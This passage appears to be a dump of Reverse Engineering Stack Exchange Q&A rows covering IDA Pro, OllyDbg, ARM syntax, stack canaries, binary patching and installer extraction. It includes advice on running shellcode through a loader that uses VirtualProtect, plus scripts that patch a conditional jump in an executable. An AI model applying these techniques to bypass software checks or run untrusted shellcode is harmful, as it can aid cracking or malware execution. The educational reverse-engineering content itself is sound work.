<li>In the stack view, ensure that enough function arguments exist to get to at least <code>+00000010</code> in the stack. Use <kbd>D</kbd> to add more function arguments as necessary.</li>
<li>Position your cursor on the <code>+00000010</code> line in the stack view and press <kbd>Alt</kbd>+<kbd>Q</kbd> to specify <code>my_struct</code> at that offset.</li>
</ol>
","3062"
"Debugging Shellcode with Bochs and IDA Pro","1924","","<p>I am using the Local Bochs Debugger along with IDA Pro to debug a shellcode. This shellcode disassembles properly in IDA Pro, however, now I want to debug it.</p>

<p>I tried debugging but since the configuration of Bochs is bare metal, it will not be able to execute some code properly, for instance:</p>

<pre><code>xor eax, eax
mov eax, dword ptr fs:[eax+0x30] // PEB
</code></pre>

<p>Since PEB is a structure defined in the Windows Operating System, Bochs does not execute this code properly (does not load the PEB address in eax).</p>

<p>Simiarly, other sections of code which parse the kernel32.dll structure to find various API addresses also does not work.</p>

<p>How can I debug the shellcode with IDA Pro and Bochs Debugger?</p>

<p>I also have the following:</p>

<pre><code>Windows XP SP3 Guest OS running in VMWare workstation.
IDA Pro running on the host OS.
</code></pre>

<p>Is it possible to place the shellcode.txt file inside the Guest OS and then debug it using IDA Pro on the host OS? I think in this case, the Windows Debugger, windbg's engine can be used.</p>

<p>What will be the configuration? In the following article:</p>

<p><a href=""https://www.hex-rays.com/products/ida/support/tutorials/debugging_windbg.pdf"">https://www.hex-rays.com/products/ida/support/tutorials/debugging_windbg.pdf</a></p>

<p>It describes how to debug a remote process running on Windows. But in my case, it is not a process but a shellcode loaded from a text file.</p>
","<p>For testing shellcode on windows and in general, it's good idea to wrap it in a small program that executes it. </p>

<p>What you could do is write a small program that would read the shellcode, say , from a file into malloc()-ed buffer and then jump to it. </p>

<p>On windows, you'd probably want to use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa366898%28v=vs.85%29.aspx"">VirtualProtect</a> to set PAGE_EXECUTE_READWRITE permissions on that memory area before jumping to it. </p>

<p>After reading shellcode into malloced memory and setting the execute permissions, you can simply use function pointer to call/jump to it. </p>

<p>This will produce the executable binary which you can run in any debugger, set the breakpoint just before the function pointer call and then debug the shellcode as you wish.</p>

<p>EDIT:</p>

<p>A quick search reveals just a program like that in an article about <a href=""http://mcdermottcybersecurity.com/articles/windows-x64-shellcode#testing"">Windows x64 Shellcode</a>. The same code can be applied on 32bit Windows.</p>
","2687"
"How to get value at the current linear address in the IDC script?","1924","","<p>I'm trying to extract a float value at the current linear address in the IDC script, but I can't figure out how to do this.</p>

<p>Disassembly example:</p>

<pre><code>.rdata:004F8360 flt_4F8360      dd 0.69999999           ; DATA XREF: sub_4071E0+68r
</code></pre>

<p>I want to print this float value in the console message like this:</p>

<pre><code>Value: 0.69999999
</code></pre>

<p>I've tried (unsuccessfully):</p>

<ul>
<li><p><code>Dword(ea)</code></p>

<pre><code>Message(""Value: %f"", Dword(ea));

Value: 1.060320051e9
</code></pre></li>
<li><p><code>GetManyBytes(ea, 4, 0)</code>:</p>

<pre><code>Message(""Value: %f"", GetManyBytes(ea, 4, 0));

Value: 3.33e2
</code></pre></li>
</ul>

<p>So how does one achieves this?</p>
","<p>By looking at the <a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/idc-module.html"" rel=""nofollow"">documentation</a>.</p>

<p>Use <a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/idc-module.html#GetFloat"" rel=""nofollow""><code>GetFloat</code></a>.</p>
","9077"
"Hex Rays - strange functions __ROL4__ and __ROR4__","1919","","<p>What's purpose of functions <strong>ROL</strong> and <strong>ROR</strong>?
For both of them, first arg is <strong>int</strong>, and second is <strong>byte</strong> </p>

<p>I suppose that's bitwise shifts</p>

<p><img src=""https://i.stack.imgur.com/9CYls.png"" alt=""two muppet[![rol and ror"">]<a href=""https://i.stack.imgur.com/9CYls.png"" rel=""nofollow noreferrer"">1</a>s]<a href=""https://imgur.com/131ibNQ"" rel=""nofollow noreferrer"" title=""rol"">2</a></p>
","<p>Check out IDA directory\plugins\defs.h.</p>



<pre><code>...
// Macros to represent some assembly instructions
// Feel free to modify them

#define __ROL__(x, y) __rotl__(x, y)       // Rotate left
#define __ROR__(x, y) __rotr__(x, y)       // Rotate right
...
</code></pre>

<p>The <a href=""https://software.intel.com/sites/landingpage/IntrinsicsGuide/#expand=111,4411,4411&amp;text=_rotl"" rel=""nofollow noreferrer""><code>__rotl__</code></a> and <a href=""https://software.intel.com/sites/landingpage/IntrinsicsGuide/#expand=111,4411,4411,4412&amp;text=_rotr"" rel=""nofollow noreferrer""><code>__rotr__</code></a> are just for the <code>rol</code> and <code>ror</code> instructions</p>
","12977"
"Segments in IDA. How to overcome NONAME problem","1919","","<p>I'm disassembling a packed 16 bit DOS MZ EXE.</p>

<p>To deobfuscate it, I've set a breakpoint in DOSbox at the end of the unpacking routine, let it run, and made a memory dump. This way I essentially got the deobfuscated EXE image.</p>

<p>Problems started when I loaded the image in IDA. You see, I don't understand the IDA's concept of segments. They are similar to x86 segments, but there are numerous differences which I can't grasp. When IDA asked me to create at least one segment, I just made a single huge segment 1 MB length, because the code and data in program's address space are mixed and it doesn't make sense to introduce separate segments such as <code>CODE</code>, <code>DATA</code> etc. </p>

<p>After showing IDA the entry point, everything worked fine: IDA successfully determined functions, local variables, arguments etc. The only problem is that some calls are marked as <code>NONAME</code>, even though they point at correct subroutines. The strangest thing is that those subroutines have correct XREFs to the 'illegal' calls. Here's an example:</p>

<pre><code>seg000:188FF 004                 call    1AD9h:1         ; Call Procedure
</code></pre>

<p>This line is red and has an associated <code>NONAME</code> problem in Problems List. Why?</p>

<p>The <code>1AD9h:1</code> seg:offset address corresponds to linear address <code>0x1ad91</code>, which has this:</p>

<pre><code>seg000:1AD91     ; =============== S U B R O U T I N E =======================================
seg000:1AD91
seg000:1AD91     ; Attributes: bp-based frame
seg000:1AD91
seg000:1AD91     sub_1AD91       proc far                ; CODE XREF: sub_188F2+DP
</code></pre>

<p>Note the XREF. So IDA actually processes the call correctly! Why is the call considered invalid? IDA help file says this:</p>

<blockquote>
  <h2>Problem: Can not find name</h2>
  
  <p><strong>Description</strong></p>
  
  <p>Two reasons can cause this problem:</p>
  
  <ol>
  <li>Reference to an illegal address is made in the program being
  disassembled;</li>
  <li>IDA couldn't find a name for the address but it must exist. </li>
  </ol>
  
  <p><strong>What to do</strong></p>
  
  <ol>
  <li><p>If this problem is caused by a reference to an illegal address</p>
  
  <ul>
  <li>Try to enter the operand manually</li>
  <li>Or <strong>make the illegal address legal by creating a new segment</strong>.</li>
  </ul></li>
  <li><p>Otherwise, the database is corrupt.</p></li>
  </ol>
</blockquote>

<p>So, I guess the problem is that I have one gargantuan segment instead of several small ones. But, how do I properly divide the address space into appropriate segments? </p>

<p>I know the register values (including <code>DS</code>, <code>CS</code>, <code>SS</code>, <code>IP</code>, etc) at the entry point. Let's assume I create a <code>CODE</code> segment starting from the segment corresponding to the CS register value at the entry point. But what length should this segment have ?</p>

<p>What's the point of segments in IDA at all? If DATA segments can contain instructions, and CODE segments can be read and written as data?</p>

<p>Please excuse me for such a newbie question, but official IDA manual is notoriously scarce and HexRays forums are closed for me because I use freeware version. </p>
","<ol>
<li><p>Your program is using a segment with base <code>1AD9h</code> (the segment part of the far call). You need to create a new segment which matches it. </p>

<pre><code>Start = 0x1AD90   (0x1AD9&lt;&lt;4)
End = 0x2AD90  [for example] (start + 64KB - maximum size)
Base = 0x1AD9
(o) 16-bit
</code></pre></li>
<li><p>Now, go through the new segment and make sure everything makes sense. Trim the segment (reduce end address) if necessary.</p></li>
<li><p>Find another far jump/call with a different segment value. Repeat step 1 for the new base.</p></li>
<li><p>Do the same with data segments (look for values loaded into <code>ds</code>/<code>es</code>/<code>ss</code>).</p></li>
</ol>
","6070"
"What is the meaning of '!' in ldm arm assembler instruction?","1914","","<p>I am quite new to ARM assembly, I already saw that the bang (<code>!</code>) is used to really update a register after a computation in the addressing mode syntax, but I can't figure out what is the difference of semantics between (this output is from <code>objdump</code> so it uses <code>gas</code> syntax):</p>

<pre><code>ldm r4!, {r0, r1, r2, r3}
</code></pre>

<p>And:</p>

<pre><code>ldm r4, {r0, r1, r2, r3}
</code></pre>

<p>Any idea ?</p>
","<p>The <code>!</code> denotes <em>writeback of the base register</em>. <strong>Base register</strong> is the register used to address the memory to be read or written - in your case it's <code>R4</code>. <strong>Writeback</strong> means that the base register will be updated with the delta equal to the size of transferred data.</p>

<p>So, the instruction </p>

<pre><code>ldm r4!, {r0, r1, r2, r3}
</code></pre>

<p>can be represented by the following pseudocode:</p>

<pre><code>r0 = *(int)(r4) 
r1 = *(int)(r4+4) 
r2 = *(int)(r4+8) 
r3 = *(int)(r4+12) 
r4 = r4 + 16 // writeback (16 bytes transferred)
</code></pre>

<p>In the variant without <code>!</code> the writeback doesn't happen so <code>R4</code> retains the original value.</p>

<p>In the <code>LDR</code> and <code>STR</code> instructions you may also encounter <em>pre-indexed</em> and <em>post-indexed</em> notation:</p>

<pre><code>LDR R0, [R4, #4]  ; simple offset: R0 = *(int*)(R4+4); R4 unchanged
LDR R0, [R4, #4]! ; pre-indexed:   R0 = *(int*)(R4+4); R4 = R4+4
LDR R0, [R4], #4  ; post-indexed:  R0 = *(int*)(R4+0); R4 = R4+4
</code></pre>

<p>For more information see the <a href=""http://www.keil.com/support/man/docs/armasm/"">ARM Assembler Guide</a>.</p>
","6062"
"Where I download plugin StrongOD 0.3.4.639?","1906","","<p>I want plugin for OllyDbg - strongOD 0.3.4.639 version. Where I find it for download? Thank for response.</p>
","<p>I don't know about that version but you can find the latest version (0.4.8.892) here</p>

<p><a href=""https://tuts4you.com/download.php?view.2028"" rel=""nofollow noreferrer"">https://tuts4you.com/download.php?view.2028</a></p>

<p>For more information about OllyDbg plugin system see <strong><em><a href=""https://stackoverflow.com/questions/14574155/how-to-setup-plugins-for-ollydbg-2-x-x"">this</a></em></strong> and <strong><em><a href=""http://www.ollydbg.de/Help/i_Plugins.htm"" rel=""nofollow noreferrer"">this</a></em></strong></p>
","4115"
"Extracting files from google chrome offline installer","1885","","<p>I'm trying to extract the files from the <a href=""https://support.google.com/installer/answer/126299?hl=en"" rel=""noreferrer"">Google Chrome offline installer</a> as a reverse engineering exercise</p>

<p>So I tried extracting the data inside the installer PE. I tried pestudio which showed me two large embedded resources, however, pestudio had no option to dump them. Extracting the PE with 7-zip shows a file with the name <code>~102</code>.</p>

<p>However, 7zip cannot make out anything out of the <code>~102</code> file. Viewing this file with a hex editor shows that it is a tar archive with around 20 bytes of additional info prepended to it. Removing these 20 bytes does not make it extractable, however.</p>

<p>How can I extract the files from the binary?</p>

<p>I'm a complete noob in reverse engineering, so please correct my mistakes instead of downvoting my question. I'd also be grateful if someone can tell me of a tool which can extract such data from PE executables (instead of my very questionable use of 7-zip for this purpose which also fails for a large number of executables).</p>
","<p>I ran the installer through an online EXE inspector which told me the <code>102</code> resource contained <em>LZMA compressed data</em>. <sup>Stupidly, I closed that window to look up what 'LZMA' is. I forgot to note the URL of this specific tool, and now I cannot find it anymore! Such a shame because this hint was <em>crucial</em>.</sup></p>

<p>I then ran it through <a href=""http://pedump.me"" rel=""nofollow"">PEdump.me</a>, which allows one to download it separately. To unpack the LZMA compression, I used Stuffit Expander (for OS X), but you can probably use 7-Zip as well -- you may need to add the file extension <code>.lzma</code> to make it work.</p>

<p>This gave me a <em>TAR-like</em> file, containing a few more executables. My local <code>tar</code> was unable to unpack it any further (possibly it's some variant of the standard <code>tar</code>).</p>

<p>The TAR file format is a wrapper to concatenate multiple files into one; its headers contain the original file name and its size, amongst other data. TAR does <em>not</em> apply compression to the resulting file, so you only need a good hex editor to manually split it into the separate programs.</p>

<hr>

<blockquote>
  <p>.. my very questionable use of 7-zip for this purpose which also fails for a large number of executables ..</p>
</blockquote>

<p>Being able to show the <a href=""http://msdn.microsoft.com/en-us/magazine/cc301805.aspx"" rel=""nofollow"">PE Sections</a> of a Windows executable is a rather uncommon function for a general compressing/uncompressing program... That said: I have found no fault in 7-zip's handling of PE executables. It splits them up into their sections and does nothing more.</p>

<p>You can use a tool such as PE Studio to <em>inspect</em> the resources (are you sure it cannot extract them? It seems such a basic function); but after extracting them, you are on your own. There is no ""standard"" way of compressing or otherwise obfuscating resources; some programs may even contain custom code to extract their own data.</p>

<p>Recognizing the format of a resource is then reduced to the more general ""recognize the file format"", which is an extremely broad topic on its own.</p>
","6045"
"Debug ELF executable","1872","","<p>I cannot load the following executable type in OllyDbg:
- ELF 32-bit LSB executable, Intel 80386</p>

<p>Why can OllyDbg not handle this kind of executables? What are good (OllyDbg-like) debuggers to debug ELF?</p>
","<p>Ollydbg debugger is for Microsoft Windows executables and DLLs. For debugging ELF I use <a href=""https://www.sourceware.org/gdb/"" rel=""nofollow noreferrer"">GDB</a> debugger. GDB can come with a GUI and you can find more about that in <a href=""https://reverseengineering.stackexchange.com/questions/1392/decent-gui-for-gdb"">this answer</a> . Besides GDB, for reversing ELF files on Linux I would also suggest <a href=""https://radare.org/r/"" rel=""nofollow noreferrer"">radare2</a>.</p>
","14364"
"OllyDBG, managed to patch file, now can I automate this?","1869","","<p>In Olly I managed to patch the file to no longer compare for a specific flag. Is it possible to automate this?</p>

<p>Basically I changed a JNZ to a JZ.</p>

<p>Is there a way to could do the same thing with a hex editor? </p>

<p>The end goal would be to create a program to automate this patch.</p>

<p>Thanks.</p>
","<p>Okay, I suppose you just want to create a program that patches the already existing file, so here's how I'd do it.</p>

<hr>

<p>First, you need the offset in the file.
That means that offset 0 is the first byte, 1 is the second, etc, as opposed to the offset + base which you see in memory.</p>

<p>To get that offset, right click the instruction, and go to <code>View &gt; Executable file</code>:</p>

<p><img src=""https://i.stack.imgur.com/tY5VJ.png"" alt=""executable file (to get the offset)""></p>

<p>And you take the offset:</p>

<p><img src=""https://i.stack.imgur.com/64kFD.png"" alt=""relative offset""></p>

<p>which is <code>0x16A7</code> in my case.</p>

<hr>

<p>Once you have the offset, you must code a program to patch the program.
Here's a few ways: (I only tested the Python one, but the rest should work)</p>

<h1>C++</h1>

<pre><code>#include &lt;iostream&gt;
#include &lt;fstream&gt;

int main() {
    std::ofstream f(""file_to_patch.exe"", std::ios::binary);
    // seek to the desired offset
    f.seekp(0x16A7);
    // \x74 to \xEB, for example (conditional short to unconditional short)
    const char bytes[] = ""\xEB"";
    f.write(bytes, sizeof(bytes));
    f.close();
    return 0;
}
</code></pre>

<h1>C</h1>

<pre><code>#include &lt;stdio.h&gt;

int main(void) {
    FILE* f = fopen(""to_patch.exe"", ""r+b""); // open
    fseek(f, 0, 0x16A7); // seek to the offset to patch
    fwrite((void*) ""\xEB"", 1, 1, f);
    fclose(f);
    return 0;
}
</code></pre>

<h1>Python</h1>

<p>In case you want to script it and don't wanna bother with C / C++, here's how you do it with Python:</p>

<pre><code>f = open(""to_patch"", ""r+b"") # open in read/write binary
f.seek(0x16A7) # seek to the previously found offset
f.write(bytearray([0xEB])) # patch the jump
f.close()
</code></pre>
","8180"
"How to break on not-yet-loaded kernel driver","1868","","<p>I've been reversing a sample of the Uroborus trojan for my own learning joy. I'm having a hard time following it once it loads a windows kernel driver that implements the rootkit.  I've set up my environment for Kernel debugging (using IDA's windbg plugin) and set a breakpoint for the new driver (it's called Fdisk.sys, so I've been typing ""bu fdisk.sys!DriverEntry"").  However, IDA never breaks when the driver is loaded. I can tell that it has run because it starts hiding a registry key (Ultra3), and dumping the memory and using Volatility to look at unloaded modules, I can see that fdisk.sys was unloaded.  I can also confirm that it's installed hooks into a number of kernel API's.  How do I get IDA/windbg to break on the driver before it gets to run? </p>
","<p>For some reason I have yet to determine, every effort to set a breakpoint on this module by name (fdisk.sys) is failing.  The driver isn't loaded at bootup (at least, not at the point that I'm investigating right now).  It's loaded by a module and then unloaded again fairly soon thereafter. </p>

<p>I finally used a debugger (indside my VM) to step through the module that launches the driver, stopped execution after the file was written to disk, and used a hex editor to change the first instruction to INT 3.  That worked; when the driver loads the exception is caught by the kernel debugger and I'm able to start reviewing.  <em>phew</em></p>

<p>Now I gotta figure out why I couldn't get it break by name.....</p>
","4033"
"Why are there (sometimes major) differences between java source code and its decompiled result?","1857","","<p>I compiled some [relatively complex] Java code into a .class file, then used jad to decompile it back into java. Of course, the code was obfuscated, which was to be expected. However, given that I had the original code, I thought I'd be able to look through the decompiled code fairly easily. However, I noticed differences in the code, such as where certain variables were defined (including differences of scope).</p>

<p>Is there any main reason for this? I imagine it's one of those things that just happen in decompilation of code, but I'm more curious about what factors cause the change (e.g. complexity of code, whether it refers to other files, etc.).</p>

<p>Could someone provide me with a good explanation on what factors cause the differences in the code before and after?</p>

<h3>Edit</h3>

<p>Technically, the .class file is pulled from a jar. I extracted the contents and used the .class file in there.</p>

<p>As far as which obfuscator I used, I used the Retroguard obfuscator with the following options (I'm currently just exploring obfuscation and finding out what each thing does to the final result):</p>

<pre><code>.option Application
.option Applet
.option Repackage
.option Annotations
.option MapClassString
.attribute LineNumberTable
.attribute EnclosingMethod
.attribute Deprecated
</code></pre>

<p>Documentation for the script can be found on <a href=""http://www.retrologic.com/rg-docs-scripting.html"" rel=""nofollow"">their site</a>. It's a little unorganized, but you should be able to find adequate explanations in there. It's also noteworthy that I stripped the generics and the local variable table.</p>

<p>I have now also set up a way (inspired by the creators of the Minecraft Coder Pack) to rename the sources using data from a file (or files), which is passed to a dictionary of lists for packages, classes, methods, and fields.</p>

<pre><code># snippet from the MCP version (mine's slightly different) (all in Python):
srg_types = {'PK:': ['obf_name', 'deobf_name'],
            'CL:': ['obf_name', 'deobf_name'],
            'FD:': ['obf_name', 'deobf_name'],
            'MD:': ['obf_name', 'obf_desc', 'deobf_name', 'deobf_desc']}
parsed_dict = {'PK': [],
               'CL': [],
               'FD': [],
               'MD': []}
</code></pre>

<p>A line is then parsed from the file, and it is passed into the <code>parsed_dict</code> and then used to rename everything (back and forth). Implemented after compiling than decompiling the first time (after I noticd differences).</p>
","<p>Java compiles to bytecode that is run in the JVM, and stored in the .class files. This bytecode is not a 1:1 representation of the original code, and includes several compiler-implemented optimizations. Information is lost when these optimizations are performed, and due to that lost information decompilers can't reconstruct the code back into exactly what it was.</p>
","2525"
"Are reverse engineering and decompilation the same?","1846","","<p>Is reverse engineering an application the same as decompiling it?</p>

<p>What is the core difference between reverse engineering an application and decompiling an application.</p>
","<p>Decompilation is just one method of reverse engineering.</p>

<p>From the <a href=""/questions/tagged/decompilation"" class=""post-tag"" title=""show questions tagged 'decompilation'"" rel=""tag"">decompilation</a> description:</p>

<blockquote>
  <p>Decompiling is the process of analyzing an executable or object code binary and outputting source code in a programming language such as C. The process involves translating a file from a low level of abstraction to a higher level of abstraction.</p>
  
  <p>Decompilation is usually carried out using a decompiler.</p>
</blockquote>

<hr>

<p>From <a href=""http://en.wikipedia.org/wiki/Reverse_engineering"">Wikipedia's article on reverse engineering</a>:</p>

<blockquote>
  <p>Reverse engineering is the process of discovering the technological principles of a device, object, or system through analysis of its structure, function, and operation.</p>
</blockquote>

<hr>

<p>Software can be reverse engineered and decompiled. A lot of other things (such as hardware, door locks) can be reverse engineered but not decompiled, because their software/firmware is written in low level languages without a higher-level representation, or, more radically, they don't <em>have</em> any firmware in the first place.</p>
","1600"
"Capturing OS/hardware communication / reverse engineering drivers","1838","","<p>My main question is how the open source community reverse engineers windows drivers (for say, video cards) to re-write them under linux.</p>

<p>Links to resources are fine, I don't expect a tutorial on driver development in an answer. But at least I need to be pointed in the right direction.</p>

<p>This is actually have been asked in other stackoverflow sub domain.However, the original writer doesn't get the correct answer and i also want to know about this reverse engineering method. I hope this question is not considered as duplicate one.</p>
","<p>It depends on the particular interface, but the general idea is often the same and usually does <strong>NOT</strong> involve disassembling the driver.  The reason is that the disassembling method for reverse engineering is not considered legal in all jurisdictions.  Here are the usual steps:</p>

<h1>1. Contact the manufacturer for needed information</h1>

<p>Obviously, the most direct approach is also the easiest if successful.  Some manufacturers are more cooperative than others.  For some types of devices, even if the manufacturer of a device is uncooperative, sometimes the manufacturer of major chips on the device are willing to share some information and this can help.</p>

<h1>2. Get general information about the device by observation</h1>

<p>A lot of information can be obtained simply by observation.  For example, what are the major components in the device?  Can we look up part numbers and find datasheets for them?  Is this version <em>n+1</em> and there is already a version <em>n</em> driver for Linux?  Does the manual or the Windows driver user interface give any important clues about registers, settings or capabilities?  Does the Windows driver support multiple devices? This can be an indication that the devices might be similar, and if there's a Linux driver for one of them already, it can help.</p>

<h1>3. Capture communications with the device for analysis</h1>

<p>For some devices such as serial ports or USB, capturing the communications between the device driver and device is usually fairly straightforward.  (See <a href=""https://reverseengineering.stackexchange.com/questions/2416/how-to-reverse-engineer-simple-usb-device-windows-linux?rq=1"">How to reverse engineer simple usb device [windows -&gt; linux]</a>) Capturing communications for video cards can be done in a couple of ways. One way it can be done is by using a proprietary Linux driver and then intercepting calls for that, as with the <a href=""http://nouveau.freedesktop.org/wiki/REnouveau/"" rel=""nofollow noreferrer"">REnouveau</a> tool. Sharing data is important, and is one reason so many drivers have been successfully written for Linux. One of the major strengths of the open source community is the fact that there are people all over the world who can and do collaborate with such efforts. </p>

<h1>4. Attempt to duplicate the communications under Linux</h1>

<p>This is a matter of writing code and trying the result. Because Linux already has a rich set of drivers, it's often easiest to start with something similar and modify it.  Since everything is open source, tinkering is not merely allowed but encouraged! For devices other than video cards, one can often write userspace code to attempt to exercise the device and to gather data and try experiments. Ultimately, a real driver is written, ideally as a kernel module, to allow unloading and reloading. This speeds the development cycle over having to reboot after any driver change (I'm looking at <strong>YOU</strong>, Windows!) </p>

<h1>5. Test extensively</h1>

<p>Testing and bugfixing is important for open source software generally, and that certainly applies to device drivers as well as anything else.  First, for inclusion in the kernel, other developers look at the code in a sometimes brutal but invariably useful process called code review.  Other experienced developers look at the source code and point out weaknesses in the code, flaws in assumptions and even typos in comments and formatting problems. Once enough people have done that, people with the actual device in question actually try it on their hardware and report bugs or anomalies. This often turns up issues such as version differences (e.g. there were multiple versions of the physical device, but all sold as the same thing) and device conflicts (both device A and device B work great individually, but fail when both are connected).</p>

<p>Ultimately, the result is a shiny new bug-free open source driver that everyone can use.  (Or that's the goal, anyway!)</p>
","10645"
"How does scanf interact with my code in assembly","1838","","<p>I have recently started getting into assembly for the purpose of reverse engineering. I started small with understanding basic datatypes, but I want to move on to more complex datatypes and functions. I am trying to understand what is happening in both methods <code>requestMaxPow</code> and <code>computePowers</code></p>

<p>Here is the <strong>source</strong> that I use</p>

<pre><code>#include &lt;stdio.h&gt;

int requestMaxPow();
int computerPowers(int);
int main(){
    int max = requestMaxPow();
    computePowers(max);
    return 0;
}

int requestMaxPow(){
    int maxPow;

    scanf (""%d"", &amp;maxPow);
    return maxPow;
}

int computePowers(int MaxPow){
    int currentVal = 0;
    int currentPow = 0;

    for(;currentPow &lt; MaxPow; ++currentPow){
        currentVal = currentPow * currentPow;
    }
}
Compiled with GCC with the following arguments ""gcc -g -O0 morecomplex.c -o morecoplex""
</code></pre>

<p>The assembly below is for the <strong>requestMaxPow</strong> method, which is the hardest for me to understand. Specifically I don't understand what ""gs"" means at 0xc5, and I have no idea what is going on between lines 0xce - 0x50. could someone well versed explain line by line what is happening?</p>

<pre><code>(gdb) disassemble 
Dump of assembler code for function requestMaxPow:
   0x080484bf &lt;+0&gt;: push   ebp
   0x080484c0 &lt;+1&gt;: mov    ebp,esp
   0x080484c2 &lt;+3&gt;: sub    esp,0x18
=&gt; 0x080484c5 &lt;+6&gt;: mov    eax,gs:0x14
   0x080484cb &lt;+12&gt;:    mov    DWORD PTR [ebp-0xc],eax
   0x080484ce &lt;+15&gt;:    xor    eax,eax
   0x080484d0 &lt;+17&gt;:    sub    esp,0x8
   0x080484d3 &lt;+20&gt;:    lea    eax,[ebp-0x10]
   0x080484d6 &lt;+23&gt;:    push   eax
   0x080484d7 &lt;+24&gt;:    push   0x80485b0
   0x080484dc &lt;+29&gt;:    call   0x8048380 &lt;__isoc99_scanf@plt&gt;
   0x080484e1 &lt;+34&gt;:    add    esp,0x10
   0x080484e4 &lt;+37&gt;:    mov    eax,DWORD PTR [ebp-0x10]
   0x080484e7 &lt;+40&gt;:    mov    edx,DWORD PTR [ebp-0xc]
   0x080484ea &lt;+43&gt;:    xor    edx,DWORD PTR gs:0x14
   0x080484f1 &lt;+50&gt;:    je     0x80484f8 &lt;requestMaxPow+57&gt;
   0x080484f3 &lt;+52&gt;:    call   0x8048350 &lt;__stack_chk_fail@plt&gt;
   0x080484f8 &lt;+57&gt;:    leave  
   0x080484f9 &lt;+58&gt;:    ret    
End of assembler dump.
</code></pre>

<p>The assembly for the <strong>computePowers</strong> method is much easier to understand. I include it just in case it has relevance to my main question.</p>

<pre><code>(gdb) disassemble 
Dump of assembler code for function computePowers:
   0x080484fa &lt;+0&gt;: push   ebp
   0x080484fb &lt;+1&gt;: mov    ebp,esp
   0x080484fd &lt;+3&gt;: sub    esp,0x10
=&gt; 0x08048500 &lt;+6&gt;: mov    DWORD PTR [ebp-0x4],0x0
   0x08048507 &lt;+13&gt;:    mov    DWORD PTR [ebp-0x8],0x0
   0x0804850e &lt;+20&gt;:    jmp    0x804851e &lt;computePowers+36&gt;
   0x08048510 &lt;+22&gt;:    mov    eax,DWORD PTR [ebp-0x8]
   0x08048513 &lt;+25&gt;:    imul   eax,DWORD PTR [ebp-0x8]
   0x08048517 &lt;+29&gt;:    mov    DWORD PTR [ebp-0x4],eax
   0x0804851a &lt;+32&gt;:    add    DWORD PTR [ebp-0x8],0x1
   0x0804851e &lt;+36&gt;:    mov    eax,DWORD PTR [ebp-0x8]
   0x08048521 &lt;+39&gt;:    cmp    eax,DWORD PTR [ebp+0x8]
   0x08048524 &lt;+42&gt;:    jl     0x8048510 &lt;computePowers+22&gt;
   0x08048526 &lt;+44&gt;:    leave  
   0x08048527 &lt;+45&gt;:    ret    
End of assembler dump.
</code></pre>

<p><strong>Edit 1</strong>
After looking at the code for a while longer I realized the xor is happening on eax to ""0"" it out, does that happen so that a return value can be stored into eax?</p>
","<p>The code between <code>80484c5</code> and <code>80484ce</code> sets up the <a href=""https://reverseengineering.stackexchange.com/questions/6627/segmentation-on-x86-for-stack-canaries"">stack canary</a>, and <code>80484e7</code> to <code>80484f3</code> checks it. gcc omits the stack checking from your second function, since it can determine (uses no pointers, doesn't call subroutines) that there's no way to overwrite the stack here. Your <code>xor eax, eax</code> isn't neccesary per se (you don't need to zero registers before storing something into them), it's just that the compiler wants to make the canary value unknown as soon as possible.</p>

<p>Omitting the stack checking results in:</p>

<pre><code>0x080484d0 &lt;+17&gt;:    sub    esp,0x8            // adjust stack alignment 
0x080484d3 &lt;+20&gt;:    lea    eax,[ebp-0x10]     // move the address of maxRow into eax
0x080484d6 &lt;+23&gt;:    push   eax                // and push it on the stack as the 2nd function argument
0x080484d7 &lt;+24&gt;:    push   0x80485b0          // Push the address of your format string as first function argument
0x080484dc &lt;+29&gt;:    call   0x8048380 &lt;__isoc99_scanf@plt&gt;  // call scanf
0x080484e1 &lt;+34&gt;:    add    esp,0x10           // remove the added bytes from the stack
0x080484e4 &lt;+37&gt;:    mov    eax,DWORD PTR [ebp-0x10]  // get the content of maxRow into eax to return it as function return value
</code></pre>

<p>3 things might need further explanation:</p>

<ul>
<li>The <code>lea</code> instruction calculates an <em>address</em>, while <code>mov</code> loads a value. Thus, <code>lea eax,[ebp-0x10]</code> is like  <code>eax=&amp;maxRow</code>, and <code>mov eax, DWORD PTR [ebp-0x10]</code> is like <code>eax=maxRow</code>.</li>
<li>In C, function arguments are pushed from behind, i.e. the last argument gets pushed first. This ensures the first argument is always at the same position, which is important for <code>varargs</code> functions like <code>printf</code> and <code>scanf</code>.</li>
<li>Since 2 arguments are passed, which needs 8 bytes, ommiting the first <code>sub esp,0x8</code> and replacing the <code>add esp,0x10</code> with <code>add esp, 0x8</code> would be more straightforward. The reason <code>gcc</code> spends these extra bytes is probably that it wants the stack pointer aligned to a multiple of 16 bytes, which speeds up certain things. Not sure about this however, since the total distance between <code>esp</code> at the start of your function and <code>esp</code> at the start of <code>scanf</code> doesn't seem to be a multiple of 16.</li>
</ul>
","10824"
"How to fix the type of a function pointer call in the Hex-Rays decompiler?","1832","","<p>In a disassembly with a call to a <code>DirectDraw-&gt;BltFast</code> function, I encountered the following:</p>

<pre><code>(*(void (__stdcall **)(LPDIRECTDRAWSURFACE7, _DWORD, _DWORD, _DWORD, _DWORD, signed int, int, int, int, int))
((void (__stdcall **)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))v17-&gt;lpVtbl + 7))(
v17,
0,
0,
*(&amp;g_COREvidSurf + 25),
0,
16,
v75,
v77,
v79,
v81);
</code></pre>

<p>The cast has too many arguments. How does one edit the call's cast to fix the disassembly ?</p>

<p>EDIT:
After applying a struct to the code:</p>

<pre><code>.text:00540825 030                 cmp     [esp+30h+arg_8], ecx
.text:00540829 030                 mov     edx, g_COREvidSurf+64h
.text:0054082F 030                 mov     eax, g_CoreVidsurf_6
.text:00540834 030                 push    10h
.text:00540836 034                 push    0
.text:00540838 038                 push    edx
.text:00540839 03C                 push    0
.text:0054083B 040                 push    0
.text:00540844 044                 mov     ecx, [eax]
.text:00540846 044                 push    eax
.text:00540847 048                 mov     eax,[ecx+IDirectDrawSurface7Vtbl.BltFast]
.text:0054084A 048                 call    eax
</code></pre>

<p>and the decompilation:</p>

<pre><code>v17.lpVtbl = (struct IDirectDrawSurface7::IDirectDrawSurface7Vtbl *)g_surface2;
(*(void (__stdcall **)(struct IDirectDrawSurface7::IDirectDrawSurface7Vtbl *, _DWORD, _DWORD, _DWORD, _DWORD, signed int, int, int, int, int))(*(_DWORD *)v17.lpVtbl + offsetof(IDirectDrawSurface7Vtbl, BltFast)))(
v17.lpVtbl,
0,
